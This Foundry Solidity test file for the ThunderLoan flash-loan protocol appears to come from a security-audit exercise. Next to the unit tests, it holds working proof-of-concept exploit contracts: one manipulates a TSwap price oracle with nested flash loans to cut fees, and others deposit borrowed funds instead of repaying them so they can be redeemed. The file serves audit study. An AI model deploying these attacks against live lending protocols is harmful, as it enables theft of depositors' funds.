// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "../../lib/forge-std/src/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
// Even though a derived contract inherits the functionality and state variables of its base contracts, each Solidity
// file must explicitly import the definitions of any contracts it wishes to instantiate or interact with directly, so
// adding:
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    function test_redeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        // @note MockTSwapPool is designed so that its only function getPriceOfOnePoolTokenInWeth() returns 1e18, and
        // does not need funding
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee); // for the fee
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        uint256 amountToRedeem = type(uint256).max; // in the redeem function, this is switched with the whole balance

        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();

        // fails!
        // initial deposit: 1000e18
        // fee: 3e17
        // balance: 1000.3e18
        // reqd to transfer back: 1003.3e18

        // issue is with ThunderLoan::deposit on these lines:
        // uint256 calculatedFee = getCalculatedFee(token, amount);
        // assetToken.updateExchangeRate(calculatedFee);
    }

    function test_OracleManipulation() public {
        // 1. Set up contracts (the mock contracts are not as detailed as we need them to be. They miss a lot of funcs.)
        // @note we need to use the buffed TSwap mock contracts: the vulnaribility tested here comes from the a Tswap
        // pool being used as a price oracle. The base mock TSwap contracts are, however, stripped down and do not have
        // the functionality we need to demonstrate what effect the price changes might have (i.e. MockTSwapPool is
        // designed so that its only function getPriceOfOnePoolTokenInWeth() returns 1e18, and does not need funding
        // @note with the excpetion of pf, these contracts are already deployed by setUp, but we need to recreate them
        // as setUp initializes thunderLoan with the mock contract, but we need it to be initialized wiht the buffed
        // mocked contact, pf
        thunderLoan = new ThunderLoan(); // recreate it
        tokenA = new ERC20Mock(); // recreate it
        proxy = new ERC1967Proxy(address(thunderLoan), ""); //recreate it
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        address tSwapPool = pf.createPool(address(tokenA));
        // This line is reassigning tl to a new instance of ThunderLoan, but this time it's not creating a new contract.
        // Instead, it's casting an existing contract (referred to by proxy) to the ThunderLoan type.
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // 2. Fund Tswap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tSwapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tSwapPool), 100e18);
        BuffMockTSwap(tSwapPool).deposit(100e18, 100e18, 100e18, block.timestamp); // i.e. ratio is 1:1
        vm.stopPrank();

        // 3. Fund ThunderLoan
        vm.startPrank(thunderLoan.owner());
        // allow
        thunderLoan.setAllowedToken(tokenA, true);
        vm.stopPrank();
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        // fund
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        // so 100e WETH and 100e tokenA in tSwap
        // and 100e in ThunderLoan

        // 4. Taking out 2 flashloans:
        // ---a. To nuke the price of weth/tokenA on Tswap:
        // -----i. take out a flash loan of 50 tokenA
        // -----ii. swap it on the dex, tanking the price
        // ---b. to show that doing so greatly reduces the fees we need to pay on ThunderLoan
        // -----i. take out another 50 tokenA flashloan (and we will se how much cheaper it is)
        uint256 normalFee = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("Normal fee is: ", normalFee); // 296147410319118389 In 2 steps, we will borrow the whole 100e18
        uint256 amountToBorrow = 40e18; // then we are gonna borrow the remaining 60e18 in the 2nd loan

        MaliciousFlashLoanReceiver_manipulatesOracleForDecreasedFees mFLR =
        new MaliciousFlashLoanReceiver_manipulatesOracleForDecreasedFees (tSwapPool, address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)), address(weth));
        console.log("balance_0: ", tokenA.balanceOf(address(mFLR)));

        vm.startPrank(user);
        // @note 1 * normalFee is insufficient, as we need to cover not only the fee of loans but also the fee of swaps!
        // @note roundUp is only used to acquire nice round numbers that results in more readable log outputs
        uint256 amountForFees = roundUp(2 * normalFee);
        tokenA.mint(address(mFLR), amountForFees); // to cover the fees. 50e18 is not enough why?

        console.log("balance_1: ", tokenA.balanceOf(address(mFLR)));

        thunderLoan.flashloan(address(mFLR), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 attackFee = mFLR.feeOne() + mFLR.feeTwo();
        console.log("Attack fee is: ", attackFee);

        assert(attackFee < normalFee);
    }

    /**
     * just for better clarity in the logs, we round up the fee value, i.e. 296147410319118389 to 3e17
     */
    function roundUp(uint256 number) internal pure returns (uint256) {
        uint256 increment = 1;
        while (number > increment) {
            increment *= 10;
        }
        increment /= 10; // Adjust back one step as the loop goes one step too far

        if (increment == 0) return number;
        uint256 remainder = number % increment;
        if (remainder == 0) return number;
        return number + increment - remainder;
    }

    /**
     * This is my solution, which utiliizes 2 flash loans.
     *
     * @notice This vulnerability is exposed only when the high severity bug in the deposit() function of ThunderLoan
     * has
     * been corrected,
     * i.e. when the following lines are commented out:
     *         // uint256 calculatedFee = getCalculatedFee(token, amount);
     *         // assetToken.updateExchangeRate(calculatedFee);
     */
    /*function test_useDepositInsteadOfRepay() public setAllowedToken hasDeposits {
        // @note tokenA is the underlying token, it is allowed via modifier, ThunderLoan is funded via modifier
        // @note MockTSwapPool does not need funding its function getPriceOfOnePoolTokenInWeth() always returns 1e18

        uint256 amountToBorrow = AMOUNT * 10; // 100e18
        uint256 amountForFees = 10e18;
        uint256 initialAssetBalance;
        uint256 endingAssetBalance;
        uint256 initialUnderlyingBalance;
        uint256 endingUnderlyingBalance;

        // deploy the malicious flash loan receiver
        MaliciousFlashLoanReceiver_depositsInsteadOfRepayToStealFunds mFLR =
    new MaliciousFlashLoanReceiver_depositsInsteadOfRepayToStealFunds(address(thunderLoan),
    address(thunderLoan.getAssetFromToken(tokenA)));
        // give funds to the contract
        console.log("balance_0: %e ", tokenA.balanceOf(address(mFLR)));
        tokenA.mint(address(mFLR), amountForFees);
        initialAssetBalance = IERC20(address(thunderLoan.getAssetFromToken(tokenA))).balanceOf(address(mFLR));
        initialUnderlyingBalance = tokenA.balanceOf(address(mFLR));
        console.log("balance_1: %e ", tokenA.balanceOf(address(mFLR)));

        vm.startPrank(user);
        // flash loan request for 100e18 tokanA which we will deposit and not repay
        thunderLoan.flashloan(address(mFLR), tokenA, amountToBorrow, "");
        vm.stopPrank();

        endingAssetBalance = IERC20(address(thunderLoan.getAssetFromToken(tokenA))).balanceOf(address(mFLR));
        endingUnderlyingBalance = tokenA.balanceOf(address(mFLR));

        console.log("Initial asset balance: %e ", initialAssetBalance);
        console.log("Ending asset balance: %e ", endingAssetBalance);
        console.log("Initial underlying balance: %e ", initialUnderlyingBalance);
        console.log("Ending underlying balance: %e ", endingUnderlyingBalance);

        vm.prank(address(mFLR));
        thunderLoan.redeem(tokenA, endingAssetBalance);

        endingUnderlyingBalance = tokenA.balanceOf(address(mFLR));
        console.log("-----Initial underlying balance: %e ", initialUnderlyingBalance);
        console.log("-----Final underlying balance: %e ", endingUnderlyingBalance);
    }*/

    function test_useDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
        // @note tokenA is the underlying token, it is allowed via modifier, ThunderLoan is funded via modifier
        // @note MockTSwapPool does not need funding its function getPriceOfOnePoolTokenInWeth() always returns 1e18

        uint256 amountToBorrow = AMOUNT * 5; // 50e18
        uint256 amountForFees = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        uint256 initialAssetBalance;
        uint256 endingAssetBalance;
        uint256 initialUnderlyingBalance;
        uint256 endingUnderlyingBalance;

        // deploy the malicious flash loan receiver
        MaliciousFlashLoanReceiver_depositOverRepay dor =
            new MaliciousFlashLoanReceiver_depositOverRepay(address(thunderLoan));
        // give funds to the contract
        console.log("balance_0: %e ", tokenA.balanceOf(address(dor)));
        tokenA.mint(address(dor), amountForFees);
        initialAssetBalance = IERC20(address(thunderLoan.getAssetFromToken(tokenA))).balanceOf(address(dor));
        initialUnderlyingBalance = tokenA.balanceOf(address(dor));
        console.log("balance_1: %e ", tokenA.balanceOf(address(dor)));

        vm.startPrank(user);
        // flash loan request for 50e18 tokanA which we will not repay but deposit
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        vm.stopPrank();

        endingAssetBalance = IERC20(address(thunderLoan.getAssetFromToken(tokenA))).balanceOf(address(dor));
        endingUnderlyingBalance = tokenA.balanceOf(address(dor));

        console.log("Initial asset balance: %e ", initialAssetBalance);
        console.log("Ending asset balance: %e ", endingAssetBalance);
        console.log("Initial underlying balance: %e ", initialUnderlyingBalance);
        console.log("Ending underlying balance: %e ", endingUnderlyingBalance);

        vm.prank(address(dor));
        // trying to redeem what we deposited instead instead of having been repaying it
        thunderLoan.redeem(tokenA, endingAssetBalance);

        endingUnderlyingBalance = tokenA.balanceOf(address(dor));
        console.log("-----Initial underlying balance: %e ", initialUnderlyingBalance);
        console.log("-----Final underlying balance: %e ", endingUnderlyingBalance);

        // @note this holds true only if we leave the ThunderLoan contract as-is,
        // and do not correct the bug in the deposit() function by removing the 2 problematic lines of code.
        // If that part is corrected, however, than the LHS is slighly less than the RHS.
        assertGt(endingUnderlyingBalance, amountToBorrow + amountForFees);
    }
}

contract MaliciousFlashLoanReceiver_manipulatesOracleForDecreasedFees is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address repayAddress;
    address wethAddress;
    BuffMockTSwap tSwapPool;
    bool attacked = false;
    uint256 public feeOne;
    uint256 public feeTwo;
    uint256 tokenBalance;
    uint256 wethBought;
    uint256 firstLoanAmount;
    uint256 secondLoanAmount;

    constructor(address _tSwapPool, address _thunderLoan, address _repayAddress, address _wethAddress) {
        tSwapPool = BuffMockTSwap(_tSwapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
        wethAddress = _wethAddress;
    }

    /**
     * This is called by ThunderLoan after a flashLoan has been requested where this contract was marked as receiver.
     * This function does the following:
     *
     * 1. swaps the firstLoanAmount to WETH (wethBought amount), which decreases the price of token relative to WETH
     * 2. requests a second loan for secondLoanAmount - this results in a second invocation of executeOperation()
     * ---- the 2nd invocation (i.e. the else branch) finishes first, and then execution of the 1st invocation (if)
     * resumes
     * 3. swaps wethBought amount of WETH back to token
     * 4. rapays secondLoanAmount with fees
     * 5. repays firstLoanAmount with fees
     *
     * @notice step 4 and 5 cannot be joined: we cannot pay back the 2 flashloans all at once at the end of the if()
     * branch,
     * becasue the contract checks for repayment immediately after each executeOperation call,
     * and the 2nd invocation of the executeOperation ends in the else() branch.
     *
     * Log output:
     *   Normal fee is:  296147410319118389
     *   balance_0:  0
     *   balance_1:  600000000000000000
     *   balance_2:  40600000000000000000
     *   balance_3:  600000000000000000
     *   balance_6:  60600000000000000000
     *   balance_7:  100428535072462606707
     *   balance_8:  40337543291067857789
     *   balance_4:  40337543291067857789
     *   balance_5:  219084326940210434
     *   Attack fee is:  209450745522396273
     *
     */
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        if (!attacked) {
            feeOne = fee;
            firstLoanAmount = amount;
            secondLoanAmount = 100e18 - firstLoanAmount;

            console.log("balance_2: ", IERC20(token).balanceOf(address(this)));

            attacked = true;
            // not necessary
            //wethBought = tSwapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tSwapPool), firstLoanAmount);
            // swap: this tanks the price of the token in terms of WETH
            tSwapPool.swapPoolTokenForWethBasedOnInputPoolToken(firstLoanAmount, 1, block.timestamp);
            wethBought = IERC20(wethAddress).balanceOf(address(this));
            console.log("balance_3: ", IERC20(token).balanceOf(address(this)));

            /**
             * 2nd flash loan request
             *         @note This triggers the 2nd invocation of executeOperation().
             *         So execution will contine in the else() branch and when that is done,
             *         execution will resume on this (if) branch.
             */
            thunderLoan.flashloan(address(this), IERC20(token), secondLoanAmount, "");
            console.log("balance_4: ", IERC20(token).balanceOf(address(this)));

            // repay 1: this does not work due to an issue with the contract:
            // you cannot user repay to repay a flash loan inside a flash loan
            /* IERC20(token).approve(address(tSwapPool), amount + fee);
            thunderLoan.repay(IERC20(token), amount + fee); // repay 1    // q cant we repay all at once? */
            // instead:
            IERC20(token).transfer(repayAddress, firstLoanAmount + fee);
            console.log("balance_5: ", IERC20(token).balanceOf(address(this)));
        } else {
            // calculate the fee and repay flash loan 2
            feeTwo = fee;
            // swap WETH back to token
            console.log("balance_6: ", IERC20(token).balanceOf(address(this)));
            IERC20(wethAddress).approve(address(tSwapPool), wethBought);
            tSwapPool.swapWethForPoolTokenBasedOnInputWeth(wethBought, 1, block.timestamp);
            console.log("balance_7: ", IERC20(token).balanceOf(address(this)));

            // repay 2
            IERC20(token).transfer(repayAddress, secondLoanAmount + fee);
            console.log("balance_8: ", IERC20(token).balanceOf(address(this)));
        }
        return true;
    }
}

/**
 * This is my solution, which utiliizes 2 flash loans.
 *
 * @notice This vulnerability is exposed only when the high severity bug in the deposit() function of ThunderLoan has
 * been corrected,
 * i.e. when the following lines are commented out:
 *         // uint256 calculatedFee = getCalculatedFee(token, amount);
 *         // assetToken.updateExchangeRate(calculatedFee);
 */
/*contract MaliciousFlashLoanReceiver_depositsInsteadOfRepayToStealFunds is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    bool attacked = false;
    address repayAddress;

    constructor(address _thunderLoan, address _repayAddress) {
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    /**
     * Output:
     * Logs:
     *   balance_0: 0e0
     *   balance_1: 1e19
     *   balance_2: 1.1e20
     *   balance_5: 1.097e20
     *   balance_3: 1.097e20
     *   needed: 1e20
     *   balance_4: 2.09760009e20
     *   balance_5: 9.160009e18
     *   Initial asset balance: 0e0
     *   Ending asset balance: 1.00479694140343321376e20
     *   Initial underlying balance: 1e19
     *   Ending underlying balance: 9.160009e18
     *   -----Initial underlying balance: 1e19
     *   -----Final underlying balance: 1.09699999999999999999e20
     */

/*   function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
/*      bytes calldata /*params*/
/* )
        external
        returns (bool)
    {
        if (!attacked) {
            attacked = true;
            // 2nd flash loan, same amount
            console.log("balance_2: %e ", IERC20(token).balanceOf(address(this)));
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            console.log("balance_3: %e ", IERC20(token).balanceOf(address(this)));
            console.log("needed: %e ", amount);

            // after the else() branch is executed, execution resumes here
            // here the 2nd flash loan is deposited (the protocol thinks it is paid back), but the first deposit is
            // still with us
            thunderLoan.redeem(IERC20(token), amount);
            console.log("balance_4: %e ", IERC20(token).balanceOf(address(this)));
            IERC20(token).transfer(repayAddress, amount + fee);
        } else { }
        // approve spending
        IERC20(token).approve(address(thunderLoan), amount + fee);
        // deposit instead of repay
        thunderLoan.deposit(IERC20(token), amount + fee);
        console.log("balance_5: %e ", IERC20(token).balanceOf(address(this)));

        return true;
    }
}*/

/**
 * @notice This vulnerability is exposed only when the high severity bug in the deposit() function of ThunderLoan has
 * been corrected,
 * i.e. when the following lines are commented out:
 *         // uint256 calculatedFee = getCalculatedFee(token, amount);
 *         // assetToken.updateExchangeRate(calculatedFee);
 */
contract MaliciousFlashLoanReceiver_depositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        IERC20(token).approve(address(thunderLoan), amount + fee);
        // deposit instead of repay
        thunderLoan.deposit(IERC20(token), amount + fee);

        return true;
    }
}
